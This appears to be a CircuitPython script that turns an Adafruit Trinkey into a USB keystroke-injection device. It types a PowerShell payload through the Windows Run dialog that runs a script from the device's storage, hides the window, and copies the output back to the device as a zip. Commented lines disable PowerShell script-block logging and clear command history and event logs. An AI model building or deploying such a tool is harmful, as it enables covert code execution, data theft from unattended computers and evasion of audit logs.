# Example HID + Storage + Execute script from Trinkey + Hide Powershell Window
# Not completely worked out yet

import time
import board
from neopixel import NeoPixel
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_win_de import KeyboardLayout  
import usb_hid
import storage

COLORS = {
    "green": (0, 255, 0),   
    "orange": (255, 165, 0),  
    "yellow": (255, 255, 0),  
    "cyan": (0, 255, 255),  
    "purple": (128, 0, 128),  
    "deep_pink": (255, 20, 147),  
    "forest_green": (34, 139, 34),  
    "hot_pink": (255, 105, 180),  
    "turquoise": (72, 209, 204),  
    "error": (255, 0, 0),  
    "blue": (0, 0, 255),
    "red": (255, 0, 0),
    "pink": (255, 182, 193)
}

pixel = NeoPixel(board.NEOPIXEL, 1)  
pixel.brightness = 0.2  

# Debug Status Blinks
def blink_status(color, step):
    interval = 0.2  
    for _ in range(step):
        try:
            pixel.fill(color)  
            time.sleep(interval)
            pixel.fill((0, 0, 0))  
            time.sleep(interval)

        except:
            blink_status(COLORS["error"], 1)
            continue

# Yield new color each call + incrementing blink count
def blink_generator():
    color_names = list(COLORS.keys())  
    while True:
        for color_key in color_names:
            yield COLORS[color_key], 1

blink_gen = blink_generator()

# Press Enter + delay
def press_enter(kbd, delay=0.1):
    try:
        kbd.press(Keycode.ENTER)
        time.sleep(delay)
        kbd.release(Keycode.ENTER)

    except Exception:
        blink_status(COLORS["error"], 1)

# Enter twice
def press_enter2(kbd, delay=0.1):
    try:
        press_enter(kbd)
        time.sleep(delay)
        press_enter(kbd)

    except Exception:
        blink_status(COLORS["error"], 1)

# Keypress wrapper - pass a kbd object
def press_key(kbd, key1, key2=None, delay=0.1):
    try:
        if key2:
            kbd.press(key1, key2)
            time.sleep(delay)
            kbd.release(key1, key2)
        else:
            kbd.press(key1)
            time.sleep(delay)
            kbd.release(key1)

    except Exception:
        blink_status(COLORS["error"], 3)

# HID Backspace wrapper function
def press_backspace(kbd, count=1, delay=0.1):
    for _ in range(count):
        press_key(kbd, Keycode.BACKSPACE, delay=0.1)
        time.sleep(delay)

# HID writeline wrapper
def a_writeln(kbd, layout, command):
    try:
        layout.write(command)
        time.sleep(0.05)
        press_enter2(kbd)

    except Exception:
        blink_status(COLORS["error"], 3)

# Windows + R - run dialog with enter at the end
def run_box(kbd, layout, command):
    blink_status(next(blink_gen)[0], 3)

    try:    
        press_key(kbd, Keycode.WINDOWS, Keycode.R)
        time.sleep(1.5)
        a_writeln(kbd, layout, command)

    except Exception:
        blink_status(COLORS["error"], 2)

# Run in Powershell via run dialog
def run_ps(kbd, layout, command):
    blink_status(next(blink_gen)[0], 3)

    try:
        press_key(kbd, Keycode.WINDOWS, Keycode.R)
        time.sleep(0.1)
        a_writeln(kbd, layout, "powershell")  
        # Enter presses tend to get lost depending on env
        press_enter2(kbd)
        time.sleep(0.3)
        press_backspace(kbd, count=10)
        a_writeln(kbd, layout, command)

    except Exception:
        blink_status(COLORS["error"], 15)

# Run in CMD via run dialog
def run_cmd(kbd, layout, command):
    blink_status(next(blink_gen)[0], 4)

    try:
        press_key(kbd, Keycode.WINDOWS, Keycode.R)
        time.sleep(0.5)
        layout.write("cmd")  
        press_key(kbd, Keycode.ENTER)
        time.sleep(0.5)
        a_writeln(kbd, layout, command)

    except Exception:
        blink_status(COLORS["error"], 2)

# Toggle storage
def toggle_storage():
    blink_status(next(blink_gen)[0], 5)

    try:
        storage.remount("/", readonly=False)  
        time.sleep(5)

    except:
        blink_status(COLORS["error"], 5)


# Init Status
blink_status(COLORS["green"], 3)

# Init Keyboard
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)

# Demo / Tests
def demos():
    run_box(kbd, layout, "echo 123")

    run_ps(kbd, layout, "Get-Process")

    run_cmd(kbd, layout, "dir")


def main():  
    # #Clear-History; Remove-Item -Force -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"; Clear-EventLog -LogName "Windows PowerShell";
    # Add history clearing as required
    # Delete temp files (not yet included)
    # Make sure Invoke-Expression running the script is the last line
    command = """
# Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Force; 
try { $env:PSReadLineOptions = $null; } catch { Write-Output "Disable failed" }
$p="C:/windows/temp"
$o="$p/sout.txt";
$dl = ((Get-Volume | Where-Object { $_.FileSystemLabel -eq "CIRCUITPY" }).DriveLetter + ":") -replace "^:$", "F:"
if (-not (Test-Path $o)) { Expand-Archive -Path "$dl/sd/rg.zip" -DestinationPath "$p" -Force; 
if (Test-Path $o) { del $o };
Start-Job -ScriptBlock { Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; using System.Threading; public class W { [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); public static void D(int d) { Thread.Sleep(d); ShowWindow(GetForegroundWindow(), 6); } }'; [W]::D(5000); }
$v = (Get-Content "$dl/sd/demo.ps1") -join "`n";
Invoke-Expression $v | Out-File -FilePath $o -Force; while (-not (Test-Path $o)) { Start-Sleep -Milliseconds 500 }; Compress-Archive -Path $o -DestinationPath "$dl/sd/$(Split-Path -Leaf $o)_$(Get-Random).zip"; exit;
"""
    time.sleep(7) 
    run_ps(kbd, layout, command)

main() 


